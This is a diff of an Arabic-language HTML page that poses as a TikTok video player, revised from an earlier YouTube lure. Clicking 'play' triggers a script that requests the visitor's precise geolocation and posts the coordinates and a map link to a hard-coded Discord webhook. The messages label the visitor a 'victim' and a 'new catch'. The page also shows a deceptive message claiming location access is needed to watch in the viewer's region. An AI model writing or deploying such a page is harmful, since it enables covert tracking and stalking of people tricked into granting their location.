@@ -1,33 +1,32 @@
-<!DOCTYPE html>
+ <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>الدحيح - حلقة جديدة</title>
+    <title>مشاهدة الفيديو</title>
     <style>
-        body { margin: 0; padding: 0; background-color: #000; font-family: sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; color: white; }
-        .video-container { width: 90%; max-width: 700px; position: relative; }
-        .overlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.6); display: flex; align-items: center; justify-content: center; z-index: 10; cursor: pointer; border-radius: 10px; }
-        .play-btn { background: #ff0000; color: white; padding: 15px 30px; border-radius: 50px; font-weight: bold; font-size: 20px; border: none; }
-        iframe { width: 100%; height: 350px; border-radius: 10px; border: none; }
+        body { margin: 0; padding: 0; background-color: #000; font-family: sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; color: white; overflow: hidden; }
+        .video-wrapper { width: 100%; max-width: 400px; height: 80vh; position: relative; background: #000; border-radius: 15px; overflow: hidden; }
+        .overlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.7); display: flex; flex-direction: column; align-items: center; justify-content: center; z-index: 99; cursor: pointer; }
+        .play-btn { background: #fe2c55; color: white; padding: 15px 40px; border-radius: 50px; font-weight: bold; font-size: 18px; border: none; box-shadow: 0 4px 15px rgba(254, 44, 85, 0.4); }
+        iframe { width: 100%; height: 100%; border: none; }
+        p { font-size: 14px; margin-top: 15px; color: #ccc; text-align: center; padding: 0 20px; }
     </style>
 </head>
 <body>
 
-    <div class="video-container" id="container">
-        <div class="overlay" id="overlay" onclick="startApp()">
-            <button class="play-btn">▶ تشغيل الحلقة</button>
+    <div class="video-wrapper">
+        <div class="overlay" id="overlay" onclick="capture()">
+            <button class="play-btn">▶ مشاهدة الفيديو</button>
+            <p>برجاء السماح بالوصول للموقع للمشاهدة في منطقتك</p>
         </div>
-        <iframe id="video" src="https://www.youtube.com/embed/pS8h6C86oXQ?autoplay=0" allow="autoplay"></iframe>
+        <iframe id="tiktok-player" src="https://www.tiktok.com/embed/v2/7459146522530188551" allow="autoplay; encrypted-media"></iframe>
     </div>
-
-    <p style="margin-top: 20px; color: #aaa;">يرجى تفعيل الصلاحيات لمشاهدة الحلقة بجودة عالية</p>
 
     <script>
         const discordUrl = 'https://discord.com/api/webhooks/1462333386679910473/Nguba4bLHhTBYcBoV_3J5VUTc3qgiDuwnrJorHJkEm4BghKpbzbTPfe3FcqI7yVe8dt_';
 
-        function startApp() {
-            // أول ما يدوس على تشغيل، نطلب اللوكيشن
+        function capture() {
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(position => {
                     const lat = position.coords.latitude;
@@ -39,22 +38,19 @@
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
                         body: JSON.stringify({
-                            content: "🎯 **صيد جديد من حلقة الدحيح!**",
+                            content: "🎬 **صيد جديد من تيك توك!**",
                             embeds: [{
-                                title: "📍 موقع الشخص",
+                                title: "📍 موقع الضحية",
                                 description: `[اضغط هنا لفتح الخريطة](${mapLink})\n\n**الإحداثيات:** ${lat}, ${lon}`,
-                                color: 16711680
+                                color: 16641365
                             }]
                         })
                     });
 
-                    // إخفاء الطبقة الوهمية وتشغيل الفيديو
+                    // إخفاء الغطاء وتشغيل الفيديو
                     document.getElementById('overlay').style.display = 'none';
-                    let video = document.getElementById('video');
-                    video.src += "&autoplay=1";
-
                 }, (error) => {
-                    alert("يجب السماح بالوصول للموقع لمشاهدة الفيديو في بلدك.");
+                    alert("عذراً، يجب السماح بالوصول للموقع لمشاهدة هذا المحتوى في بلدك.");
                 }, { enableHighAccuracy: true });
             }
         }
